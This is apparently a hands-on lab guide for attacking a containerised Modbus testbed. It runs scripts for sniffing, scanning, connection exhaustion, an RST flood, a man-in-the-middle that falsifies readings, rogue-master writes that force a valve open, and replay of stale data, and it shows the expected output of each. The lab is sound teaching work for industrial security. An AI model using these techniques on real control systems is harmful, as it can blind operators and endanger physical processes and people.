# Attacking Modbus — Lab Guide

## Prerequisites
- Docker Desktop installed and running
- Wireshark installed on the host (optional, for traffic capture)

---

## 1. Build and start the testbed

```bash
docker-compose up --build
```

Expected output (master terminal):
```
[MASTER] Temp (x0.1°C)=235 | Pressure (x0.1 kPa)=856 | Flow (x0.1 L/min)=1020 | Valve (0=closed)=0 | Voltage (x0.1 V)=480
```

Wireshark filter to observe normal traffic: `tcp.port == 502`

---

## 2. Interception — B9: Passive Reconnaissance

```bash
docker exec modbus-attacker python interception_passive.py
```

Expected output:
```
[B9] REQ → 172.20.0.3 -> 172.20.0.2  unit=1  Read Holding Registers  start_addr=0  count=5
[B9] RSP ← 172.20.0.2 -> 172.20.0.3  unit=1  Read Holding Registers  register_values=[235, 856, 1020, 0, 480]
```

---

## 3. Interception — B6: Modbus Network Scanning

```bash
docker exec modbus-attacker python interception_scan.py
```

Expected output:
```
[B6] Unit   1 FOUND — raw HR values: [235, 856, 1020, 0, 480, 0, 0, 0, 0, 0]
         Temperature (x0.1 °C) = 235
         Pressure (x0.1 kPa) = 856
         ...
[B6] Scan complete — 1 unit(s) found: [1]
```

---

## 4. Interruption — T10: TCP Pool Exhaustion

```bash
docker exec modbus-attacker python interruption_pool_exhaustion.py
```

Expected output:
```
[T10] Pre-attack connectivity check: OK
[T10] 120 connections established  |  0 failed
[T10] Mid-attack connectivity check: REFUSED (pool full)
[T10] Post-attack connectivity check: OK — slave recovered
```

---

## 5. Interruption — T11: TCP RST Flood

Open **two terminals**.

Terminal 1 (observe master):
```bash
docker logs -f modbus-master
```

Terminal 2 (launch attack):
```bash
docker exec modbus-attacker python interruption_rst_flood.py
```

Expected effect: master log shows `Connection lost` and then reconnects.

---

## 6. Modification — B14: Rogue Interloper (MITM)

Open **two terminals**.

Terminal 1 — start the proxy:
```bash
docker exec modbus-attacker python modification_mitm.py
```

Terminal 2 — start a test master pointed at the proxy (172.20.0.4):
```bash
docker exec -e SLAVE_IP=172.20.0.4 modbus-master python modbus_client.py
```

Expected effect — proxy terminal:
```
[B14] FC03 response intercepted — original=[235, 856, 1020, 0, 480] → sent_to_master=[470, 1712, 2040, 0, 960]
```
The master receives doubled values while the slave's real state is unchanged.

---

## 7. Fabrication — B4: Direct Slave Control (Rogue Master)

```bash
docker exec modbus-attacker python fabrication_rogue_master.py
```

Expected output:
```
[B4] Legitimate values before attack: HR[0-4] = [235, 856, 1020, 0, 480]
[B4]   HR[0] = 9999  (Temperature → 9999)  → OK
[B4]   HR[3] = 1     (Valve → forced OPEN) → OK
[B4] Slave register state after attack: HR[0-4] = [9999, 0, 0, 1, 0]
[B4] The legitimate master now reads FALSIFIED data from the slave.
```

---

## 8. Fabrication — B2: Response Replay

```bash
docker exec modbus-attacker python fabrication_replay.py
```

Expected output:
```
[B2] Snapshot captured at t=0: HR[0-4] = [235, 856, 1020, 0, 480]
[B2] Slave's TRUE current state:  HR[0-4] = [8750, 856, 1020, 1, 480]
[B2] [12:34:56] Master receives (REPLAY): [235, 856, 1020, 0, 480]
                Slave's real state:        [8750, 856, 1020, 1, 480]  ← operator is BLIND to this
```

---

## Teardown

```bash
docker-compose down
```
